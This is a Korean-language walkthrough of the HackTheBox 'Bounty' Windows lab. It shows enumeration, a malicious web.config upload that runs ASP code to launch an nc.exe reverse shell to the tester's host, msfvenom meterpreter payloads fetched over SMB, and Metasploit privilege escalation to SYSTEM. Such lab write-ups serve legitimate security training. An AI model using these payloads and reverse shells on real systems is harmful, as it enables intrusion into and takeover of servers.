# HackTheBox - Bounty Writeup

**OS:** Windows  
**Difficulty:** Easy  
**IP:** 10.129.189.114

---

## 목차

1. [[#정보 수집 (Enumeration)]]
2. [[#파일 업로드 취약점 발견]]
3. [[#악성 web.config 업로드 - RCE 획득]]
4. [[#권한 상승 - Administrator]]
5. [[#Root Flag]]
6. [[#삽질 모음]]
7. [[#공격 흐름 요약]]

---

## 정보 수집 (Enumeration)

### Nmap 스캔

```bash
nmap -p- --min-rate 10000 -T4 10.129.189.114
```

**열린 포트:**

|포트|서비스|
|---|---|
|80/tcp|HTTP (IIS)|

### 웹 디렉토리 스캔

```bash
gobuster dir -u http://10.129.189.114 -w /usr/share/wordlists/dirb/common.txt -x asp,aspx
```

**발견된 경로:**

- `/aspnet_client/` (301)
- `/transfer.aspx` → 파일 업로드 폼 ✅

---

## 파일 업로드 취약점 발견

### /transfer.aspx

```
http://10.129.189.114/transfer.aspx
```

파일 업로드 폼 발견. `.config` 파일 업로드 테스트:

```bash
echo "test" > test.config
```

브라우저에서 업로드 시도 → **성공!** ✅

### IIS web.config

IIS에서 ASP.NET 웹 애플리케이션 설정을 관리하는 파일: **`web.config`**

web.config에 ASP 코드를 삽입하면 서버에서 실행 가능 → **RCE 가능!**

### 업로드된 파일 경로

```
http://10.129.189.114/UploadedFiles/[파일명]
```

---

## 악성 web.config 업로드 - RCE 획득

### Samba 공유 설정

```bash
sudo nano /etc/samba/smb.conf
```

```ini
[share]
path = /srv/samba/
browseable = yes
read only = no
create mask = 777
guest ok = yes
force user = nobody
force group = nogroup
```

```bash
sudo mkdir -p /srv/samba
sudo chmod 777 /srv/samba
cp /usr/share/windows-resources/binaries/nc.exe /srv/samba/
sudo service smbd restart
sudo service nmbd restart
```

### 악성 web.config 생성

```bash
cat > ~/web.config << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set obj = CreateObject("WScript.Shell")
obj.Exec("cmd /c \\10.10.17.240\share\nc.exe 10.10.17.240 4444 -e cmd.exe")
%>
EOF
```

### 리스너 설정 및 업로드

```bash
nc -lvnp 4444
```

1. `http://10.129.189.114/transfer.aspx` 에서 `web.config` 업로드
2. 브라우저에서 `http://10.129.189.114/UploadedFiles/web.config` 접속
3. 리버스 쉘 연결! ✅

**연결 계정:** `c:\windows\system32\inetsrv` (IIS 권한)

### User Flag

```cmd
type C:\Users\merlin\Desktop\user.txt
```

> **주의:** 유저 이름이 `merline`이 아니라 `merlin`!

---

## 권한 상승 - Administrator

### 시스템 정보 확인

```cmd
systeminfo
wmic qfe list
```

**결과:** 핫픽스 없음 (`No Instance(s) Available`) → 완전히 패치되지 않은 시스템!

### Meterpreter 세션 획득

**32비트 페이로드 생성:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.240 LPORT=5555 -f exe -o /srv/samba/shell.exe
```

**msfconsole 핸들러:**

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.17.240
set LPORT 5555
run
```

**Windows 쉘에서 실행:**

```cmd
copy \\10.10.17.240\share\shell.exe C:\windows\temp\shell.exe
C:\windows\temp\shell.exe
```

> **주의:** SMB 경로에서 직접 실행 시 `Access is denied` → 반드시 로컬로 복사 후 실행!

### local_exploit_suggester 실행

```
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

**취약한 익스플로잇 목록 (주요):**

|번호|모듈|
|---|---|
|1|exploit/windows/local/bypassuac_comhijack|
|2|exploit/windows/local/bypassuac_eventvwr|
|6|exploit/windows/local/ms14_058_track_popup_menu|
|7|exploit/windows/local/ms15_051_client_copy_image|
|8|exploit/windows/local/ms16_075_reflection|
|9|exploit/windows/local/ms16_075_reflection_juicy|

### 64비트 Meterpreter 세션 획득

ms15_051이 WOW64(32비트) 환경에서 실패 → 64비트 페이로드 필요:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.240 LPORT=5555 -f exe -o /srv/samba/shell64.exe
```

**msfconsole 핸들러:**

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.17.240
set LPORT 5555
run
```

**Windows 쉘에서 실행:**

```cmd
copy \\10.10.17.240\share\shell64.exe C:\windows\temp\shell64.exe
C:\windows\temp\shell64.exe
```

### ms16_075_reflection_juicy로 SYSTEM 획득

```
use exploit/windows/local/ms16_075_reflection_juicy
set SESSION 2
set LHOST 10.10.17.240
set LPORT 6666
run
```

**결과:** SYSTEM 권한 meterpreter 세션 획득! ✅

---

## Root Flag

```
shell
type C:\Users\Administrator\Desktop\root.txt
```

**Root Flag 획득** 🎉

---

## 삽질 모음

### 1. Gobuster 느림

- `-x asp,aspx` 확장자 추가로 스캔이 느려짐
- **해결:** 미리 알려진 경로 `/transfer.aspx` 직접 접근으로 빠르게 확인

### 2. 유저 이름 오타

- `merline`으로 접근 시도 → 경로 없음
- **실제 유저:** `merlin` (e 없음)

### 3. SMB에서 shell.exe 직접 실행 불가

- `\\10.10.17.240\share\shell.exe` 직접 실행 → `Access is denied`
- **해결:** `copy` 명령으로 로컬 복사 후 실행

### 4. ms15_051 WOW64 오류

- 32비트 meterpreter 세션에서 ms15_051 실행 → `WOW64 is not supported`
- **해결:** 64비트 페이로드(`windows/x64/meterpreter/reverse_tcp`)로 새 세션 생성

### 5. ms15_051 페이로드 호환성 오류

- `windows/x64/meterpreter/reverse_tcp`를 ms15_051에 설정 → `not a compatible payload`
- **해결:** `ms16_075_reflection_juicy` 모듈로 변경 → 성공

---

## 공격 흐름 요약

```
[Nmap 스캔]
    → 80/tcp HTTP (IIS)
    ↓
[Gobuster 디렉토리 스캔]
    → /transfer.aspx 발견
    ↓
[.config 파일 업로드 가능 확인]
    ↓
[악성 web.config 업로드]
    → ASP 코드 + nc.exe reverse shell
    → IIS 권한 쉘 획득
    ↓
[User Flag 획득]
    → C:\Users\merlin\Desktop\user.txt
    ↓
[Meterpreter 세션 획득]
    → 32비트 → 64비트로 업그레이드
    ↓
[local_exploit_suggester]
    → ms16_075_reflection_juicy 선택
    ↓
[SYSTEM 권한 획득]
    → C:\Users\Administrator\Desktop\root.txt 🎉
```

---

## 참고 링크

- [web.config RCE - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services)
- [ms16_075 Juicy Potato](https://github.com/ohpe/juicy-potato)
- [Metasploit local_exploit_suggester](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)